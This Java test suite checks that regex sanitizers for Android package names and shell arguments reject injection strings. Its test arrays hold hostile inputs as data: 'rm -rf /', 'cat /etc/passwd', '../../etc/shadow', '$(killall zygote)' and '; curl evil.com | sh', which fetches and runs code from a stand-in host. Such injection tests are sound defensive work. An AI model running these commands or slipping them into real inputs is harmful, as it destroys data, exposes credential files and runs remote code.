package org.tontos.tests.security;

import org.tontos.tests.common.TestAssert;
import java.util.regex.Pattern;

public class SecuritySanitizationTest {

    public static void run() {
        System.out.println("  --> [Security] Sanitization & Shell Guard Suite");

        TestAssert.runTest("Package Sanitization - Valid Formats", () -> {
            Pattern pattern = Pattern.compile("^[a-zA-Z0-9._-]+$");
            String[] validPackages = {
                "org.fossify.phone",
                "org.fossify.messages",
                "de.baumann.browser",
                "com.android.settings",
                "org.tontos.launcher"
            };
            for (String pkg : validPackages) {
                TestAssert.assertTrue(pattern.matcher(pkg).matches(), "Valid package failed: " + pkg);
            }
        });

        TestAssert.runTest("Package Sanitization - Reject Injections", () -> {
            Pattern pattern = Pattern.compile("^[a-zA-Z0-9._-]+$");
            String[] maliciousPackages = {
                "org.fossify.phone; rm -rf /",
                "app`id`",
                "com.test | cat /etc/passwd",
                "test$(reboot)",
                "bad&name",
                "pkg\nreboot"
            };
            for (String pkg : maliciousPackages) {
                TestAssert.assertFalse(pattern.matcher(pkg).matches(), "Injection allowed: " + pkg);
            }
        });

        TestAssert.runTest("Shell Injection Guard - Metacharacters", () -> {
            Pattern safeArgPattern = Pattern.compile("^[a-zA-Z0-9._/\\-]+$");
            String[] maliciousArgs = {
                ";", "&", "|", "`", "$", "(", ")", ">", "<", "\"", "'", "\n", "\r", "\t"
            };
            for (String arg : maliciousArgs) {
                TestAssert.assertFalse(safeArgPattern.matcher(arg).matches(), "Metacharacter allowed: " + arg);
            }
        });

        TestAssert.runTest("Extended Payloads & Path Traversal Guard", () -> {
            Pattern safeArgPattern = Pattern.compile("^[a-zA-Z0-9._/\\-]+$");
            String[] safeArgs = {"/system/bin/am", "start", "-n", "org.fossify.phone/.MainActivity"};
            for (String arg : safeArgs) {
                TestAssert.assertTrue(safeArgPattern.matcher(arg).matches(), "Safe arg rejected: " + arg);
            }

            String[] traversalPayloads = {
                "../../../../etc/shadow",
                "; curl evil.com | sh",
                "$(killall zygote)",
                "`touch /data/local/tmp/pwn`",
                "arg1 || reboot",
                "foo && bar"
            };
            for (String payload : traversalPayloads) {
                boolean matches = safeArgPattern.matcher(payload).matches();
                boolean containsMeta = payload.contains(";") || payload.contains("&") ||
                                       payload.contains("|") || payload.contains("`") ||
                                       payload.contains("$");
                TestAssert.assertTrue(!matches || !containsMeta, "Malicious shell payload bypass: " + payload);
            }
        });

        TestAssert.runTest("SafeCommandExecutor - Array Token Isolation", () -> {
            String[] cmd = new String[]{"/system/bin/cmd", "package", "compile", "-m", "speed", "org.fossify.phone"};
            TestAssert.assertEquals(6, cmd.length, "Command token count");
            TestAssert.assertEquals("/system/bin/cmd", cmd[0], "Executable binary path");
            for (String token : cmd) {
                TestAssert.assertNotNull(token, "Token cannot be null");
                TestAssert.assertFalse(token.isEmpty(), "Token cannot be empty");
            }
        });
    }
}
